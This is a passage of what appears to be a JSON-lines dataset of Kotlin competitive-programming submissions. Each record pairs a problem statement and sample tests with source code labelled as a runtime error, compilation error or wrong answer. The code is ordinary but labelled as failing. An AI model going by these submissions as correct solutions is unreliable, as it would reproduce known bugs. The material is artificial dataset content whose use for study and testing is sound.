tokenizer = StringTokenizer(jin.readLine())\n        val l1 = tokenizer.nextToken().toInt()\n        val l2 = tokenizer.nextToken().toInt()\n        val length = tokenizer.nextToken().toInt()\n        out.appendln(if (hash(l1 - 1, l1 + length - 1) == hash(l2 - 1, l2 + length - 1)) \"YES\" else \"NO\")\n    }\n    print(out)\n}\n\n\/*\n20\n11011101011100101111\n3\n1 4 3\n4 6 6\n1 16 5\n\nNO\nYES\nYES\n *\/","description":"In this problem, we will deal with binary strings. Each character of a binary string is either a 0 or a 1. We will also deal with substrings; recall that a substring is a contiguous subsequence of a string. We denote the substring of string $$$s$$$ starting from the $$$l$$$-th character and ending with the $$$r$$$-th character as $$$s[l \\dots r]$$$. The characters of each string are numbered from $$$1$$$.We can perform several operations on the strings we consider. Each operation is to choose a substring of our string and replace it with another string. There are two possible types of operations: replace 011 with 110, or replace 110 with 011. For example, if we apply exactly one operation to the string 110011110, it can be transformed into 011011110, 110110110, or 110011011.Binary string $$$a$$$ is considered reachable from binary string $$$b$$$ if there exists a sequence $$$s_1$$$, $$$s_2$$$, ..., $$$s_k$$$ such that $$$s_1 = a$$$, $$$s_k = b$$$, and for every $$$i \\in [1, k - 1]$$$, $$$s_i$$$ can be transformed into $$$s_{i + 1}$$$ using exactly one operation. Note that $$$k$$$ can be equal to $$$1$$$, i.\u2009e., every string is reachable from itself.You are given a string $$$t$$$ and $$$q$$$ queries to it. Each query consists of three integers $$$l_1$$$, $$$l_2$$$ and $$$len$$$. To answer each query, you have to determine whether $$$t[l_1 \\dots l_1 + len - 1]$$$ is reachable from $$$t[l_2 \\dots l_2 + len - 1]$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^5$$$) \u2014 the length of string $$$t$$$. The second line contains one string $$$t$$$ ($$$|t| = n$$$). Each character of $$$t$$$ is either 0 or 1. The third line contains one integer $$$q$$$ ($$$1 \\le q \\le 2 \\cdot 10^5$$$) \u2014 the number of queries. Then $$$q$$$ lines follow, each line represents a query. The $$$i$$$-th line contains three integers $$$l_1$$$, $$$l_2$$$ and $$$len$$$ ($$$1 \\le l_1, l_2 \\le |t|$$$, $$$1 \\le len \\le |t| - \\max(l_1, l_2) + 1$$$) for the $$$i$$$-th query.","output_spec":"For each query, print either YES if $$$t[l_1 \\dots l_1 + len - 1]$$$ is reachable from $$$t[l_2 \\dots l_2 + len - 1]$$$, or NO otherwise. You may print each letter in any register.","notes":null,"sample_inputs":["5\n11011\n3\n1 3 3\n1 4 2\n1 2 3"],"sample_outputs":["Yes\nYes\nNo"]}
{"difficulty":2600,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"a06ebb2734365ec97d07cd1b6b3faeed","submission_id":"fc21de6fc25fe3bb21bc014ae48fcab6","tags":["data structures","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.*\nimport java.util.*\n\n\/**\n * Built using CHelper plug-in\n * Actual solution is at the top\n *\n * @author aryssoncf\n *\/\nobject programkt {\n    @JvmStatic\n    fun main(args: Array<String>) {\n        val inputStream = System.`in`\n        val outputStream: OutputStream = System.out\n        val `in` = InputReader(inputStream)\n        val out = OutputWriter(outputStream)\n        val solver = D1FrequencyProblemEasyVersion()\n        solver.solve(1, `in`, out)\n        out.close()\n    }\n\n    internal class D1FrequencyProblemEasyVersion {\n        fun solve(testNumber: Int, `in`: InputReader, out: OutputWriter) {\n            val n = `in`.readInt()\n            val a = `in`.readIntArray(n)\n            MiscUtils.decreaseByOne(a)\n            val counter: MutableMap<Int, Int> = HashMap()\n            for (x in a) {\n                counter[x] = counter.getOrDefault(x, 0) + 1\n            }\n            var mf = 0\n            val m = ArrayUtils.maxElement(a) + 1\n            for (i in 1 until m) {\n                if (counter[i]!! > counter[mf]!!) {\n                    mf = i\n                }\n            }\n            var ans = 0\n            for (x in 0 until m) {\n                if (x != mf) {\n                    ans = Math.max(ans, solve(n, a, mf, x))\n                }\n            }\n            out.printLine(ans)\n        }\n\n        fun solve(n: Int, A: IntArray, a: Int, b: Int): Int {\n            val ca = ArrayUtils.count(A, a)\n            val cb = ArrayUtils.count(A, b)\n            val goal = ca - cb\n            val pos = IntArray(ca + cb + 1)\n            pos[cb] = n\n            var delta = 0\n            for (i in n - 1 downTo 0) {\n                if (A[i] == a) {\n                    delta++\n                } else if (A[i] == b) {\n                    delta--\n                }\n                if (pos[delta + cb] == 0) {\n                    pos[delta + cb] = i\n                }\n            }\n            var ans = 0\n            delta = 0\n            for (i in 0 until n) {\n                ans = Math.max(ans, pos[goal - delta + cb] - i)\n                if (A[i] == a) {\n                    delta++\n                } else if (A[i] == b) {\n                    delta--\n                }\n            }\n            return ans\n        }\n    }\n\n    internal class OutputWriter {\n        private val writer: PrintWriter\n\n        constructor(outputStream: OutputStream?) {\n            writer = PrintWriter(BufferedWriter(OutputStreamWriter(outputStream)))\n        }\n\n        constructor(writer: Writer?) {\n            this.writer = PrintWriter(writer)\n        }\n\n        fun close() {\n            writer.close()\n        }\n\n        fun printLine(i: Int) {\n            writer.println(i)\n        }\n    }\n\n    internal object MiscUtils {\n        fun decreaseByOne(array: IntArray) {\n            for (i in array.indices) {\n                array[i]--\n            }\n        }\n    }\n\n    internal class InputReader(private val stream: InputStream) {\n        private val buf = ByteArray(1024)\n        private var curChar = 0\n        private var numChars = 0\n        private val filter: SpaceCharFilter? = null\n        fun readIntArray(size: Int): IntArray {\n            val array = IntArray(size)\n            for (i in 0 until size) {\n                array[i] = readInt()\n            }\n            return array\n        }\n\n        fun read(): Int {\n            if (numChars == -1) {\n                throw InputMismatchException()\n            }\n            if (curChar >= numChars) {\n                curChar = 0\n                numChars = try {\n                    stream.read(buf)\n                } catch (e: IOException) {\n                    throw InputMismatchException()\n                }\n                if (numChars <= 0) {\n                    return -1\n                }\n            }\n            return buf[curChar++].toInt()\n        }\n\n        fun readInt(): Int {\n            var c = read()\n            while (isSpaceChar(c)) {\n                c = read()\n            }\n            var sgn = 1\n            if (c == '-'.toInt()) {\n                sgn = -1\n                c = read()\n            }\n            var res = 0\n            do {\n                if (c < '0'.toInt() || c > '9'.toInt()) {\n                    throw InputMismatchException()\n                }\n                res *= 10\n                res += c - '0'.toInt()\n                c = read()\n            } while (!isSpaceChar(c))\n            return res * sgn\n        }\n\n        fun isSpaceChar(c: Int): Boolean {\n            return filter?.isSpaceChar(c) ?: isWhitespace(c)\n        }\n\n        interface SpaceCharFilter {\n            fun isSpaceChar(ch: Int): Boolean\n        }\n\n        companion object {\n            fun isWhitespace(c: Int): Boolean {\n                return c == ' '.toInt() || c == '\\n'.toInt() || c == '\\r'.toInt() || c == '\\t'.toInt() || c == -1\n            }\n        }\n    }\n\n    internal object ArrayUtils {\n        fun maxElement(array: IntArray?): Int {\n            return Arrays.stream(array).max().asInt\n        }\n\n        fun count(array: IntArray, value: Int): Int {\n            var result = 0\n            for (i in array) {\n                if (i == value) {\n                    result++\n                }\n            }\n            return result\n        }\n    }\n}","description":"This is the easy version of the problem. The difference between the versions is in the constraints on the array elements. You can make hacks only if all versions of the problem are solved.You are given an array $$$[a_1, a_2, \\dots, a_n]$$$. Your goal is to find the length of the longest subarray of this array such that the most frequent value in it is not unique. In other words, you are looking for a subarray such that if the most frequent value occurs $$$f$$$ times in this subarray, then at least $$$2$$$ different values should occur exactly $$$f$$$ times.An array $$$c$$$ is a subarray of an array $$$d$$$ if $$$c$$$ can be obtained from $$$d$$$ by deletion of several (possibly, zero or all) elements from the beginning and several (possibly, zero or all) elements from the end.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$1 \\le n \\le 200\\,000$$$)\u00a0\u2014 the length of the array. The second line contains $$$n$$$ integers $$$a_1, a_2, \\ldots, a_n$$$ ($$$1 \\le a_i \\le min(n, 100)$$$)\u00a0\u2014 elements of the array.","output_spec":"You should output exactly one integer \u00a0\u2014 the length of the longest subarray of the array whose most frequent value is not unique. If there is no such subarray, output $$$0$$$.","notes":"NoteIn the first sample, the subarray $$$[1, 1, 2, 2, 3, 3]$$$ is good, but $$$[1, 1, 2, 2, 3, 3, 3]$$$ isn't: in the latter there are $$$3$$$ occurrences of number $$$3$$$, and no other element appears $$$3$$$ times.","sample_inputs":["7\n1 1 2 2 3 3 3","10\n1 1 1 5 4 1 3 1 2 2","1\n1"],"sample_outputs":["6","7","0"]}
{"difficulty":1600,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"a17bac596b1f060209534cbffdf0f40e","submission_id":"re_1171","tags":["implementation","strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"import com.sun.xml.internal.fastinfoset.util.StringArray\nimport java.io.DataInputStream\nimport java.io.InputStream\nimport java.lang.StringBuilder\nimport kotlin.math.PI\nimport kotlin.math.ceil\nimport kotlin.math.floor\nimport kotlin.math.max\nimport kotlin.math.min\nimport kotlin.math.sqrt\nimport kotlin.random.Random\n\ninternal class Parserdoubt(`in`: InputStream) {\n    private val BUFFER_SIZE = 1 shl 17\n\n    private val din: DataInputStream\n    private val buffer: ByteArray\n    private var bufferPointer: Int = 0\n    private var bytesRead: Int = 0\n\n    init {\n        din = DataInputStream(`in`)\n        buffer = ByteArray(BUFFER_SIZE)\n        bytesRead = 0\n        bufferPointer = bytesRead\n    }\n\n    @Throws(Exception::class)\n    fun nextString(): String {\n        val sb = StringBuffer(\"\")\n        var c = read()\n        while (c <= ' '.toByte())\n            c = read()\n        do {\n            sb.append(c.toChar())\n            c = read()\n        } while (c > ' '.toByte())\n        return sb.toString()\n    }\n\n    @Throws(Exception::class)\n    fun wholeLine(): String {\n        val sb = StringBuffer(\"\")\n        var c = read()\n        while (c <= '\\n'.toByte())\n            c = read()\n        do {\n            sb.append(c.toChar())\n            c = read()\n        } while (c > '\\n'.toByte())\n        return sb.toString()\n    }\n\n    @Throws(Exception::class)\n    fun nextChar(): Char {\n        var c = read()\n        while (c <= ' '.toByte())\n            c = read()\n        return c.toChar()\n    }\n\n    @Throws(Exception::class)\n    fun nextInt(): Int {\n        var ret = 0\n        var c = read()\n        while (c <= ' '.toByte())\n            c = read()\n        val neg = c == '-'.toByte()\n        if (neg)\n            c = read()\n        do {\n            ret = ret * 10 + c - '0'.toInt()\n            c = read()\n        } while (c > ' '.toByte())\n        return if (neg) -ret else ret\n    }\n\n    @Throws(Exception::class)\n    fun nextLong(): Long {\n        var ret: Long = 0\n        var c = read()\n        while (c <= ' '.toByte())\n            c = read()\n        val neg = c == '-'.toByte()\n        if (neg)\n            c = read()\n        do {\n            ret = ret * 10 + c - '0'.toLong()\n            c = read()\n        } while (c > ' '.toByte())\n        return if (neg) -ret else ret\n    }\n\n    @Throws(Exception::class)\n    private fun fillBuffer() {\n        bufferPointer = 0\n        bytesRead = din.read(buffer, 0, BUFFER_SIZE)\n        if (bytesRead == -1)\n            buffer[0] = -1\n    }\n\n    @Throws(Exception::class)\n    private fun read(): Byte {\n        if (bufferPointer == bytesRead)\n            fillBuffer()\n        return buffer[bufferPointer++]\n    }\n}\n\nfun process(s: String, k: Int):String?{\n    var id = s.length - 1\n    var seenK = 0\n    while(seenK < k && id>=0){\n        if(\"aeiou\".contains(s[id]))seenK++\n        if(seenK < k)id--\n    }\n    if(id==-1)return null\n    return s.substring(id)\n}\n\nfun main(args : Array<String>) {\n\n    val input = Parserdoubt(`in` = System.`in`)\n    val NT = 1\/\/input.nextInt()\n    val sb = StringBuilder()\n    for(test in 1..NT){\n        val n= input.nextInt()\n        val k= input.nextInt()\n        var ans = \"aaaa\"\n        for(i in 0 until n){\n            val s = StringArray()\n            for(j in 0..3){\n                s.add(process(input.nextString(), k))\n            }\n            if(s[0] == null || s[1] == null ||s[2] == null ||s[3] == null ){\n                ans = \"NO\"\n                break\n            }\n            if(s[0] == s[1] && s[0] == s[2] && s[0] == s[3])\n                continue\n\n            if(s[0] == s[1] && s[3] == s[2]){\n                if(ans == \"aaaa\" || ans == \"aabb\"){\n                    ans = \"aabb\"\n                } else {\n                    ans = \"NO\"\n                    break\n                }\n            }\n\n            else if(s[0] == s[2] && s[1] == s[3]){\n                if(ans == \"aaaa\" || ans == \"abab\"){\n                    ans = \"abab\"\n                } else {\n                    ans = \"NO\"\n                    break\n                }\n            }\n\n            else if(s[0] == s[3] && s[1] == s[2]){\n                if(ans == \"aaaa\" || ans == \"abba\"){\n                    ans = \"abba\"\n                } else {\n                    ans = \"NO\"\n                    break\n                }\n            }\n            else {\n                ans = \"NO\"\n                break\n            }\n        }\n        println(ans)\n\n    }\n}\n","description":"Vera adores poems. All the poems Vera knows are divided into quatrains (groups of four lines) and in each quatrain some lines contain rhymes.Let's consider that all lines in the poems consist of lowercase Latin letters (without spaces). Letters \"a\", \"e\", \"i\", \"o\", \"u\" are considered vowels.Two lines rhyme if their suffixes that start from the k-th vowels (counting from the end) match. If a line has less than k vowels, then such line can't rhyme with any other line. For example, if k\u2009=\u20091, lines commit and hermit rhyme (the corresponding suffixes equal it), and if k\u2009=\u20092, they do not rhyme (ommit\u2009\u2260\u2009ermit).Today on a literature lesson Vera learned that quatrains can contain four different schemes of rhymes, namely the following ones (the same letters stand for rhyming lines):   Clerihew (aabb);  Alternating (abab);  Enclosed (abba). If all lines of a quatrain pairwise rhyme, then the quatrain can belong to any rhyme scheme (this situation is represented by aaaa).If all quatrains of a poem belong to the same rhyme scheme, then we can assume that the whole poem belongs to this rhyme scheme. If in each quatrain all lines pairwise rhyme, then the rhyme scheme of the poem is aaaa. Let us note that it doesn't matter whether lines from different quatrains rhyme with each other or not. In other words, it is possible that different quatrains aren't connected by a rhyme.Vera got a long poem as a home task. The girl has to analyse it and find the poem rhyme scheme. Help Vera cope with the task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u20092500, 1\u2009\u2264\u2009k\u2009\u2264\u20095)\u00a0\u2014 the number of quatrains in the poem and the vowel's number, correspondingly. Next 4n lines contain the poem. Each line is not empty and only consists of small Latin letters. The total length of the lines does not exceed 104. If we assume that the lines are numbered starting from 1, then the first quatrain contains lines number 1, 2, 3, 4; the second one contains lines number 5, 6, 7, 8; and so on.","output_spec":"Print the rhyme scheme of the poem as \"aabb\", \"abab\", \"abba\", \"aaaa\"; or \"NO\" if the poem does not belong to any of the above mentioned schemes.","notes":"NoteIn the last sample both quatrains have rhymes but finding the common scheme is impossible, so the answer is \"NO\".","sample_inputs":["1 1\nday\nmay\nsun\nfun","1 1\nday\nmay\ngray\nway","2 1\na\na\na\na\na\na\ne\ne","2 1\nday\nmay\nsun\nfun\ntest\nhill\nfest\nthrill"],"sample_outputs":["aabb","aaaa","aabb","NO"]}
{"difficulty":2100,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"be82b8f209217875221ebe5de8675971","submission_id":"9e295f03be0d1e07b4c73adeb7351143","tags":["implementation","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.BufferedReader\nimport java.io.InputStream\nimport java.io.InputStreamReader\nimport java.util.*\nimport kotlin.math.abs\nimport kotlin.math.max\nimport kotlin.math.min\n\nval MOD = 1_000_000_007\n\nclass Solver(stream: InputStream, private val out: java.io.PrintWriter) {\n  fun solve() {\n    val N = ni()\n    val P1 = na(N)\n    val P = P1.clone()\n    zip(P)\n    P.reverse()\n    val T = ni()\n    val Q = na(T, -1)\n    val needsOpen = BooleanArray(N)\n    for (i in 0 until T) {\n      needsOpen[N - 1 - Q[i]] = true\n    }\n    val negFlg = BooleanArray(N)\n    val lstOpen = ArrayDeque<Int>()\n    for (i in 0 until N) {\n      val canClose = lstOpen.isNotEmpty() && P[lstOpen.last] == P[i]\n      val toOpen = needsOpen[i] || !canClose\n      if (toOpen) {\n        lstOpen.addLast(i)\n      } else {\n        lstOpen.removeLast()\n      }\n      negFlg[i] = !toOpen\n    }\n    if (lstOpen.isNotEmpty()) {\n      out.println(\"NO\")\n    } else {\n      out.println(\"YES\")\n      for (i in 0 until N) {\n        P1[i] *= if (negFlg[N - 1 - i]) 1 else -1 \/\/ \u53cd\u8ee2\u3059\u308b\u306e\u3067\n      }\n      out.println(P1.joinToString(\" \"))\n    }\n  }\n\n  fun zip(A: IntArray) {\n    val ids = A.distinct().sorted().toIntArray()\n    for (i in 0 until A.size) {\n      A[i] = lowerBound(ids, 0, A[i])\n    }\n  }\n\n  fun lowerBound(A: IntArray, s: Int, x: Int): Int {\n    var l = s - 1\n    var h = A.size\n    while(h - l > 1) {\n      val m = (h + l) \/ 2\n      if (A[m] >= x) h = m\n      else l = m\n    }\n    return h\n  }\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  private val isDebug = try {\n    \/\/ \u306a\u3093\u304b\u672c\u756a\u3067\u30a8\u30e9\u30fc\u3067\u308b\n    System.getenv(\"MY_DEBUG\") != null\n  } catch (t: Throwable) {\n    false\n  }\n\n  private var tokenizer: StringTokenizer? = null\n  private val reader = BufferedReader(InputStreamReader(stream), 32768)\n  private fun next(): String {\n    while (tokenizer == null || !tokenizer!!.hasMoreTokens()) {\n      tokenizer = StringTokenizer(reader.readLine())\n    }\n    return tokenizer!!.nextToken()\n  }\n\n  private fun ni() = next().toInt()\n  private fun nl() = next().toLong()\n  private fun ns() = next()\n  private fun na(n: Int, offset: Int = 0): IntArray {\n    return map(n) { ni() + offset }\n  }\n\n  private inline fun map(n: Int, f: (Int) -> Int): IntArray {\n    val res = IntArray(n)\n    for (i in 0 until n) {\n      res[i] = f(i)\n    }\n    return res\n  }\n\n  private inline fun debug(msg: () -> String) {\n    if (isDebug) System.err.println(msg())\n  }\n\n  private fun debug(a: LongArray) {\n    debug { a.joinToString(\" \") }\n  }\n\n  private fun debug(a: IntArray) {\n    debug { a.joinToString(\" \") }\n  }\n\n  private fun debug(a: BooleanArray) {\n    debug { a.map { if (it) 1 else 0 }.joinToString(\"\") }\n  }\n\n  private fun debugDim(A: Array<IntArray>) {\n    if (isDebug) {\n      for (a in A) {\n        debug(a)\n      }\n    }\n  }\n\n  \/**\n   * \u52dd\u624b\u306bimport\u6d88\u3055\u308c\u308b\u306e\u3092\u9632\u304e\u305f\u3044\n   *\/\n  private fun hoge() {\n    min(1, 2)\n    max(1, 2)\n    abs(-10)\n  }\n}\n\nfun <A, B> pair(a: A, b: B) = RPair(a, b)\ndata class RPair<A, B>(val _1: A, val _2: B)\n\nfun main() {\n  val out = java.io.PrintWriter(System.out)\n  Solver(System.`in`, out).solve()\n  out.flush()\n}","description":"As you know, Vova has recently become a new shaman in the city of Ultima Thule. So, he has received the shaman knowledge about the correct bracket sequences. The shamans of Ultima Thule have been using lots of different types of brackets since prehistoric times. A bracket type is a positive integer. The shamans define a correct bracket sequence as follows:  An empty sequence is a correct bracket sequence.  If {a1,\u2009a2,\u2009...,\u2009al} and {b1,\u2009b2,\u2009...,\u2009bk} are correct bracket sequences, then sequence {a1,\u2009a2,\u2009...,\u2009al,\u2009b1,\u2009b2,\u2009...,\u2009bk} (their concatenation) also is a correct bracket sequence.  If {a1,\u2009a2,\u2009...,\u2009al} \u2014 is a correct bracket sequence, then sequence  also is a correct bracket sequence, where v (v\u2009&gt;\u20090) is an integer. For example, sequences {1,\u20091,\u2009\u2009-\u20091,\u20092,\u2009\u2009-\u20092,\u2009\u2009-\u20091} and {3,\u2009\u2009-\u20093} are correct bracket sequences, and {2,\u2009\u2009-\u20093} is not.Moreover, after Vova became a shaman, he learned the most important correct bracket sequence {x1,\u2009x2,\u2009...,\u2009xn}, consisting of n integers. As sequence x is the most important, Vova decided to encrypt it just in case.Encrypting consists of two sequences. The first sequence {p1,\u2009p2,\u2009...,\u2009pn} contains types of brackets, that is, pi\u2009=\u2009|xi| (1\u2009\u2264\u2009i\u2009\u2264\u2009n). The second sequence {q1,\u2009q2,\u2009...,\u2009qt} contains t integers \u2014 some positions (possibly, not all of them), which had negative numbers in sequence {x1,\u2009x2,\u2009...,\u2009xn}.Unfortunately, Vova forgot the main sequence. But he was lucky enough to keep the encryption: sequences {p1,\u2009p2,\u2009...,\u2009pn} and {q1,\u2009q2,\u2009...,\u2009qt}. Help Vova restore sequence x by the encryption. If there are multiple sequences that correspond to the encryption, restore any of them. If there are no such sequences, you should tell so.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009106). The second line contains n integers: p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains integer t (0\u2009\u2264\u2009t\u2009\u2264\u2009n), followed by t distinct integers q1,\u2009q2,\u2009...,\u2009qt (1\u2009\u2264\u2009qi\u2009\u2264\u2009n). The numbers in each line are separated by spaces.","output_spec":"Print a single string \"NO\" (without the quotes) if Vova is mistaken and a suitable sequence {x1,\u2009x2,\u2009...,\u2009xn} doesn't exist. Otherwise, in the first line print \"YES\" (without the quotes) and in the second line print n integers x1,\u2009x2,\u2009...,\u2009xn (|xi|\u2009=\u2009pi;\u00a0xqj\u2009&lt;\u20090). If there are multiple sequences that correspond to the encrypting, you are allowed to print any of them.","notes":null,"sample_inputs":["2\n1 1\n0","4\n1 1 1 1\n1 3","3\n1 1 1\n0","4\n1 2 2 1\n2 3 4"],"sample_outputs":["YES\n1 -1","YES\n1 1 -1 -1","NO","YES\n1 2 -2 -1"]}
{"difficulty":1900,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"c16c49baf7b2d179764871204475036e","submission_id":"re_1135","tags":["dp","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.io.BufferedReader\nimport java.io.InputStream\nimport java.io.InputStreamReader\nimport java.util.*\nimport kotlin.math.abs\nimport kotlin.math.max\nimport kotlin.math.min\n\nval MOD = 1_000_000_007L\n\ninline fun just(c: Char) = run {\n  when(c) {\n    '*', '?', '.' -> -1\n    else -> c - '0'\n  }\n}\n\ninline fun bombable(c: Char) = run {\n  when(c) {\n    '*', '?' -> true\n    else -> false\n  }\n}\n\nclass Solver(stream: InputStream, private val out: java.io.PrintWriter) {\n  fun solve() {\n    val S = \"..${ns()}..\"\n    val N = S.length\n    val dp = Array(N){Array(2){LongArray(2)} }\n    dp[1][0][0] = 1\n\n    for (i in 2 until N) {\n      for (cur in 0 until 2) {\n        if (!bombable(S[i]) && cur == 1) continue\n        for (pre in 0 until 2) {\n          for (prepre in 0 until 2) {\n            val preJust = just(S[i - 1])\n            if (preJust != -1 && preJust != cur + prepre) continue\n\n            dp[i][pre][cur] += dp[i - 1][prepre][pre]\n            if (dp[i][pre][cur] >= MOD) dp[i][pre][cur] -= MOD\n          }\n        }\n      }\n      debug{\"DP($i)\"}\n      debugDim(dp[i])\n    }\n\n    val ans = dp[N-1][0][0]\n    out.println(ans)\n  }\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  private val isDebug = try {\n    \/\/ \u306a\u3093\u304b\u672c\u756a\u3067\u30a8\u30e9\u30fc\u3067\u308b\n    System.getenv(\"MY_DEBUG\") != null\n  } catch (t: Throwable) {\n    false\n  }\n\n  private var tokenizer: StringTokenizer? = null\n  private val reader = BufferedReader(InputStreamReader(stream), 32768)\n  private fun next(): String {\n    while (tokenizer == null || !tokenizer!!.hasMoreTokens()) {\n      tokenizer = StringTokenizer(reader.readLine())\n    }\n    return tokenizer!!.nextToken()\n  }\n\n  private fun ni() = next().toInt()\n  private fun nl() = next().toLong()\n  private fun ns() = next()\n  private fun na(n: Int, offset: Int = 0): IntArray {\n    return map(n) { ni() + offset }\n  }\n  private fun nal(n: Int, offset: Int = 0): LongArray {\n    val res = LongArray(n)\n    for (i in 0 until n) {\n      res[i] = nl()\n    }\n    return res\n  }\n\n  private inline fun map(n: Int, f: (Int) -> Int): IntArray {\n    val res = IntArray(n)\n    for (i in 0 until n) {\n      res[i] = f(i)\n    }\n    return res\n  }\n\n  private inline fun debug(msg: () -> String) {\n    if (isDebug) System.err.println(msg())\n  }\n\n  private fun debug(a: LongArray) {\n    debug { a.joinToString(\" \") }\n  }\n\n  private fun debug(a: IntArray) {\n    debug { a.joinToString(\" \") }\n  }\n\n  private fun debug(a: BooleanArray) {\n    debug { a.map { if (it) 1 else 0 }.joinToString(\"\") }\n  }\n\n  private fun debugDim(A: Array<LongArray>) {\n    if (isDebug) {\n      for (a in A) {\n        debug(a)\n      }\n    }\n  }\n\n  \/**\n   * \u52dd\u624b\u306bimport\u6d88\u3055\u308c\u308b\u306e\u3092\u9632\u304e\u305f\u3044\n   *\/\n  private fun hoge() {\n    min(1, 2)\n    max(1, 2)\n    abs(-10)\n  }\n}\n\nfun main() {\n  val out = java.io.PrintWriter(System.out)\n  Solver(System.`in`, out).solve()\n  out.flush()\n}","description":"Game \"Minesweeper 1D\" is played on a line of squares, the line's height is 1 square, the line's width is n squares. Some of the squares contain bombs. If a square doesn't contain a bomb, then it contains a number from 0 to 2 \u2014 the total number of bombs in adjacent squares.For example, the correct field to play looks like that: 001*2***101*. The cells that are marked with \"*\" contain bombs. Note that on the correct field the numbers represent the number of bombs in adjacent cells. For example, field 2* is not correct, because cell with value 2 must have two adjacent cells with bombs.Valera wants to make a correct field to play \"Minesweeper 1D\". He has already painted a squared field with width of n cells, put several bombs on the field and wrote numbers into some cells. Now he wonders how many ways to fill the remaining cells with bombs and numbers are there if we should get a correct field in the end.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains sequence of characters without spaces s1s2... sn (1\u2009\u2264\u2009n\u2009\u2264\u2009106), containing only characters \"*\", \"?\" and digits \"0\", \"1\" or \"2\". If character si equals \"*\", then the i-th cell of the field contains a bomb. If character si equals \"?\", then Valera hasn't yet decided what to put in the i-th cell. Character si, that is equal to a digit, represents the digit written in the i-th square.","output_spec":"Print a single integer \u2014 the number of ways Valera can fill the empty cells and get a correct field. As the answer can be rather large, print it modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first test sample you can get the following correct fields: 001**1, 001***, 001*2*, 001*10.","sample_inputs":["?01???","?","**12","1"],"sample_outputs":["4","2","0","0"]}
{"difficulty":1900,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"c1de33ee9bb05db090c4d23ec9994f72","submission_id":"re_776","tags":["dp","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"@file:Suppress(\"NOTHING_TO_INLINE\", \"EXPERIMENTAL_FEATURE_WARNING\", \"OVERRIDE_BY_INLINE\")\n\nimport java.io.PrintWriter\nimport java.util.StringTokenizer\nimport kotlin.math.*\nimport kotlin.random.*\nimport kotlin.collections.sort as _sort\nimport kotlin.collections.sortDescending as _sortDescending\nimport kotlin.io.println as iprintln\n\n\/** @author Spheniscine *\/\nfun main() { _writer.solve(); _writer.flush() }\nfun PrintWriter.solve() {\n    val s = readLn()\n    val k = readInt()\n\n    val n = s.length\n    val C = List(n) { IntArray(n - it + 1) }\n    for (l in 2 .. n) {\n        for (i in 0 .. n - l) {\n            C[i][l] = C[i+1][l-2]\n            if(s[i] != s[i+l-1]) C[i][l]++\n        }\n    }\n\n    val D = List(k+1) { IntArray(n+1) { Int.MAX_VALUE } }\n    val P = List(k+1) { IntArray(n+1) }\n\n    D[0][0] = 0\n\n    for(i in 0 until k) {\n        for(j in 0 until n) {\n            if(D[i][j] == Int.MAX_VALUE) continue\n            for(l in 1 .. n-j) {\n                if(D[i+1].setMin(j+l, D[i][j] + C[i][l])) P[i+1][j+l] = l\n            }\n        }\n    }\n\n    val kf = (0..k).minBy { D[it][n] }!!\n    val cost = D[kf][n]\n    val pals = Array(kf) { \"\" }\n    var j = n\n    for(i in kf downTo 1) {\n        val l = P[i][j]\n        j -= l\n        pals[i-1] = buildString {\n            val sub = s.substring(j, j + (l\/2))\n            append(sub)\n            if(l and 1 == 1) append(s[j + l\/2])\n            append(sub.reversed())\n        }\n    }\n\n    println(cost)\n    println(pals.joinToString(\"+\"))\n}\n\nfun IntArray.setMin(i: Int, v: Int): Boolean {\n    if(v < get(i)) {\n        set(i, v)\n        return true\n    }\n    return false\n}\n\n\/** IO code start *\/\n\/\/@JvmField val INPUT = File(\"input.txt\").inputStream()\n\/\/@JvmField val OUTPUT = File(\"output.txt\").outputStream()\n@JvmField val INPUT = System.`in`\n@JvmField val OUTPUT = System.out\n\n@JvmField val _reader = INPUT.bufferedReader()\nfun readLine(): String? = _reader.readLine()\nfun readLn() = _reader.readLine()!!\n@JvmField var _tokenizer: StringTokenizer = StringTokenizer(\"\")\nfun read(): String {\n    while (_tokenizer.hasMoreTokens().not()) _tokenizer = StringTokenizer(_reader.readLine() ?: return \"\", \" \")\n    return _tokenizer.nextToken()\n}\nfun readInt() = read().toInt()\nfun readDouble() = read().toDouble()\nfun readLong() = read().toLong()\nfun readStrings(n: Int) = List(n) { read() }\nfun readLines(n: Int) = List(n) { readLn() }\nfun readInts(n: Int) = List(n) { read().toInt() }\nfun readIntArray(n: Int) = IntArray(n) { read().toInt() }\nfun readDoubles(n: Int) = List(n) { read().toDouble() }\nfun readDoubleArray(n: Int) = DoubleArray(n) { read().toDouble() }\nfun readLongs(n: Int) = List(n) { read().toLong() }\nfun readLongArray(n: Int) = LongArray(n) { read().toLong() }\n\n@JvmField val _writer = PrintWriter(OUTPUT, false)\n\n\/** shuffles and sort overrides to avoid quicksort attacks *\/\nprivate inline fun <T> _shuffle(rnd: Random, get: (Int) -> T, set: (Int, T) -> Unit, size: Int) {\n    \/\/ Fisher-Yates shuffle algorithm\n    for (i in size - 1 downTo 1) {\n        val j = rnd.nextInt(i + 1)\n        val temp = get(i)\n        set(i, 